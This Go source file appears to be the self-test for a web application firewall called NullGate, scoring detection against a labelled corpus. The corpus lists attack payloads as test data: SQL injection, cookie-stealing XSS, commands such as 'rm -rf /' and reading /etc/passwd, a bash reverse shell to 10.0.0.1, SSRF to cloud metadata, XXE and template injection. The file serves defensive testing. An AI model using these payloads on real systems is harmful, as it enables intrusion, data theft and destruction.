package waf

import (
	"fmt"
	"sort"
	"strings"
	"time"
)

// SelfTest exercises the detection engine against a curated corpus of real
// attack payloads and benign traffic, then reports detection rate and false
// positives. It runs the payloads through the exact same Decoder + RuleEngine
// path the live pipeline uses, so the numbers reflect production behavior.
//
// This is the WAF's own proof of correctness: a single `nullgate --selftest`
// produces a results matrix suitable for a competition demo or a CI gate.

// TestCase is one labeled probe.
type TestCase struct {
	Name      string
	Category  Category
	Payload   string
	Malicious bool // true = we expect a block; false = we expect a pass
}

// SelfTestResult is the outcome of one case.
type SelfTestResult struct {
	Case    TestCase
	Blocked bool
	Score   int
	TopCat  Category
	Correct bool
}

// SelfTestReport aggregates all case outcomes.
type SelfTestReport struct {
	Results        []SelfTestResult `json:"results"`
	Total          int              `json:"total"`
	Malicious      int              `json:"malicious"`
	Benign         int              `json:"benign"`
	TruePositives  int              `json:"true_positives"`
	FalseNegatives int              `json:"false_negatives"`
	TrueNegatives  int              `json:"true_negatives"`
	FalsePositives int              `json:"false_positives"`
	Duration       time.Duration    `json:"duration"`
}

// DetectionRate is TP / (TP + FN).
func (r *SelfTestReport) DetectionRate() float64 {
	if r.Malicious == 0 {
		return 0
	}
	return float64(r.TruePositives) / float64(r.Malicious)
}

// FalsePositiveRate is FP / (FP + TN).
func (r *SelfTestReport) FalsePositiveRate() float64 {
	if r.Benign == 0 {
		return 0
	}
	return float64(r.FalsePositives) / float64(r.Benign)
}

// Precision is TP / (TP + FP).
func (r *SelfTestReport) Precision() float64 {
	if r.TruePositives+r.FalsePositives == 0 {
		return 0
	}
	return float64(r.TruePositives) / float64(r.TruePositives+r.FalsePositives)
}

// Recall is TP / (TP + FN), equivalent to DetectionRate.
func (r *SelfTestReport) Recall() float64 { return r.DetectionRate() }

// F1Score is the harmonic mean of precision and recall.
func (r *SelfTestReport) F1Score() float64 {
	precision, recall := r.Precision(), r.Recall()
	if precision+recall == 0 {
		return 0
	}
	return 2 * precision * recall / (precision + recall)
}

// RunSelfTest evaluates the full corpus against a fresh engine built from cfg.
func RunSelfTest(cfg *Config) *SelfTestReport {
	rules := NewRuleEngine(cfg.Rules.ParanoiaLevel, cfg.Rules.CustomPatterns)
	return evaluateSelfTest(cfg, rules)
}

func evaluateSelfTest(cfg *Config, rules *RuleEngine) *SelfTestReport {
	decoder := NewDecoder(cfg.Decoding)

	scan := func(payload string) (blocked bool, score int, cat Category) {
		var agg ScanResult
		for _, variant := range decoder.Variants(payload) {
			res := rules.Scan(variant)
			agg.Matches = append(agg.Matches, res.Matches...)
			agg.AnomalyScore += res.AnomalyScore
			if res.HasCritical {
				agg.HasCritical = true
			}
		}
		return agg.Blocked(&cfg.Rules), agg.AnomalyScore, agg.TopCategory()
	}

	report := &SelfTestReport{}
	start := time.Now()

	for _, tc := range selfTestCorpus() {
		blocked, score, cat := scan(tc.Payload)
		correct := blocked == tc.Malicious
		report.Results = append(report.Results, SelfTestResult{
			Case: tc, Blocked: blocked, Score: score, TopCat: cat, Correct: correct,
		})
		report.Total++
		if tc.Malicious {
			report.Malicious++
			if blocked {
				report.TruePositives++
			} else {
				report.FalseNegatives++
			}
		} else {
			report.Benign++
			if blocked {
				report.FalsePositives++
			} else {
				report.TrueNegatives++
			}
		}
	}
	report.Duration = time.Since(start)
	return report
}

// String renders a human-readable results matrix.
func (r *SelfTestReport) String() string {
	var b strings.Builder
	b.WriteString("\n╔══════════════════════════════════════════════════════════════════════╗\n")
	b.WriteString("║                    NullGate WAF — Self-Test Report                     ║\n")
	b.WriteString("╚══════════════════════════════════════════════════════════════════════╝\n\n")

	// Group failures for a focused view, but print the full matrix.
	fmt.Fprintf(&b, "%-38s %-12s %-7s %-6s %s\n", "CASE", "CATEGORY", "SCORE", "VERDICT", "RESULT")
	fmt.Fprintf(&b, "%s\n", strings.Repeat("─", 78))

	results := make([]SelfTestResult, len(r.Results))
	copy(results, r.Results)
	sort.SliceStable(results, func(i, j int) bool {
		return string(results[i].Case.Category) < string(results[j].Case.Category)
	})

	for _, res := range results {
		verdict := "ALLOW"
		if res.Blocked {
			verdict = "BLOCK"
		}
		mark := "✓ PASS"
		if !res.Correct {
			if res.Case.Malicious {
				mark = "✗ MISS (false negative)"
			} else {
				mark = "✗ FAIL (false positive)"
			}
		}
		name := res.Case.Name
		if len(name) > 37 {
			name = name[:34] + "..."
		}
		fmt.Fprintf(&b, "%-38s %-12s %-7d %-6s %s\n",
			name, res.Case.Category, res.Score, verdict, mark)
	}

	fmt.Fprintf(&b, "%s\n", strings.Repeat("─", 78))
	fmt.Fprintf(&b, "Total cases:      %d  (%d malicious, %d benign)\n", r.Total, r.Malicious, r.Benign)
	fmt.Fprintf(&b, "True positives:   %d\n", r.TruePositives)
	fmt.Fprintf(&b, "False negatives:  %d\n", r.FalseNegatives)
	fmt.Fprintf(&b, "True negatives:   %d\n", r.TrueNegatives)
	fmt.Fprintf(&b, "False positives:  %d\n", r.FalsePositives)
	fmt.Fprintf(&b, "Detection rate:   %.1f%%\n", r.DetectionRate()*100)
	fmt.Fprintf(&b, "False-pos rate:   %.1f%%\n", r.FalsePositiveRate()*100)
	fmt.Fprintf(&b, "Elapsed:          %s  (%.1f µs/case)\n",
		r.Duration.Round(time.Microsecond),
		float64(r.Duration.Microseconds())/float64(max(r.Total, 1)))

	if r.FalseNegatives == 0 && r.FalsePositives == 0 {
		b.WriteString("\n✅ ALL CHECKS PASSED — 100% detection, 0% false positives.\n")
	} else {
		b.WriteString("\n⚠  Review the FAIL/MISS rows above.\n")
	}
	return b.String()
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

// selfTestCorpus is the labeled attack + benign dataset. Attacks include both
// raw and encoded variants to prove the decoding pipeline works end-to-end.
func selfTestCorpus() []TestCase {
	return []TestCase{
		// ---- SQL Injection ----
		{"SQLi tautology", CatSQLi, `' OR '1'='1`, true},
		{"SQLi UNION SELECT", CatSQLi, `1 UNION SELECT username,password FROM users`, true},
		{"SQLi DROP TABLE", CatSQLi, `1; DROP TABLE users--`, true},
		{"SQLi time-based blind", CatSQLi, `1 AND SLEEP(5)`, true},
		{"SQLi URL-encoded UNION", CatSQLi, `%75%6e%69%6f%6e%20%73%65%6c%65%63%74`, true},
		{"SQLi comment-split UNION", CatSQLi, `un/**/ion sel/**/ect 1,2,3`, true},
		{"SQLi info_schema", CatSQLi, `SELECT table_name FROM information_schema.tables`, true},
		{"SQLi xp_cmdshell", CatSQLi, `';EXEC xp_cmdshell('whoami')--`, true},

		// ---- XSS ----
		{"XSS script tag", CatXSS, `<script>alert(1)</script>`, true},
		{"XSS img onerror", CatXSS, `<img src=x onerror=alert(document.cookie)>`, true},
		{"XSS javascript URI", CatXSS, `javascript:alert(1)`, true},
		{"XSS svg onload", CatXSS, `<svg onload=alert(1)>`, true},
		{"XSS HTML-entity encoded", CatXSS, `&#60;script&#62;alert(1)&#60;/script&#62;`, true},
		{"XSS unicode-escaped", CatXSS, `\u003cscript\u003ealert(1)\u003c/script\u003e`, true},
		{"XSS iframe injection", CatXSS, `<iframe src=javascript:alert(1)>`, true},

		// ---- RCE / Command Injection ----
		{"RCE semicolon chain", CatRCE, `; cat /etc/passwd`, true},
		{"RCE pipe id", CatRCE, `| id`, true},
		{"RCE PHP system()", CatRCE, `system('rm -rf /')`, true},
		{"RCE backtick", CatRCE, "`whoami`", true},
		{"RCE reverse shell", CatRCE, `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`, true},
		{"RCE windows cmd", CatRCE, `cmd.exe /c dir`, true},

		// ---- LFI / Path Traversal ----
		{"LFI traversal passwd", CatLFI, `../../../../etc/passwd`, true},
		{"LFI php filter wrapper", CatLFI, `php://filter/convert.base64-encode/resource=index.php`, true},
		{"LFI encoded traversal", CatLFI, `..%2f..%2f..%2fetc%2fpasswd`, true},
		{"LFI windows path", CatLFI, `C:\windows\system32\drivers\etc\hosts`, true},

		// ---- SSRF ----
		{"SSRF cloud metadata", CatSSRF, `http://169.254.169.254/latest/meta-data/`, true},
		{"SSRF loopback", CatSSRF, `http://127.0.0.1:8080/admin`, true},
		{"SSRF gopher scheme", CatSSRF, `gopher://127.0.0.1:6379/_INFO`, true},
		{"SSRF private range", CatSSRF, `http://192.168.1.1/`, true},

		// ---- XXE ----
		{"XXE external entity", CatXXE, `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`, true},

		// ---- SSTI ----
		{"SSTI python gadget", CatSSTI, `{{ ''.__class__.__mro__[1].__subclasses__() }}`, true},
		{"SSTI jinja config", CatSSTI, `{{ config.items() }}`, true},

		// ---- NoSQLi ----
		{"NoSQLi operator", CatNoSQLi, `{"user": {"$ne": null}}`, true},

		// ---- Deserialization ----
		{"Java serialized marker", CatDeserialize, `rO0ABXNyABelloWorld`, true},
		{"PHP object injection", CatDeserialize, `O:8:"stdClass":1:{s:4:"code";s:10:"phpinfo();";}`, true},

		// ---- Prototype Pollution ----
		{"Proto pollution", CatProtoPollution, `{"__proto__": {"isAdmin": true}}`, true},

		// ---- CRLF ----
		{"CRLF header injection", CatCRLF, `%0d%0aSet-Cookie: admin=true`, true},

		// ---- Scanner ----
		{"Scanner sqlmap UA", CatScanner, `sqlmap/1.7.2#stable`, true},
		{"Scanner webshell path", CatScanner, `/uploads/shell.php`, true},

		// ---- Benign traffic (must NOT block) ----
		{"Benign search query", "benign", `laptop under 1000 dollars`, false},
		{"Benign email", "benign", `alice.smith@example.com`, false},
		{"Benign JSON profile", "benign", `{"name":"Bob","age":30,"city":"Amman"}`, false},
		{"Benign URL path", "benign", `/products/category/electronics?page=2`, false},
		{"Benign markdown", "benign", `Check the **docs** at https://example.com/guide`, false},
		{"Benign SQL-like prose", "benign", `I would like to select a table for our meeting`, false},
		{"Benign date", "benign", `2026-08-02T14:30:00Z`, false},
		{"Benign file upload name", "benign", `quarterly_report_final_v2.pdf`, false},
		{"Benign user comment", "benign", `Great product, works and looks amazing!`, false},
		{"Benign Arabic text", "benign", `مرحبا، هذا منتج رائع جدا وأنصح به`, false},
		{"Benign phone", "benign", `+962-79-123-4567`, false},
		{"Benign hex color", "benign", `background-color: #1a2b3c`, false},
	}
}
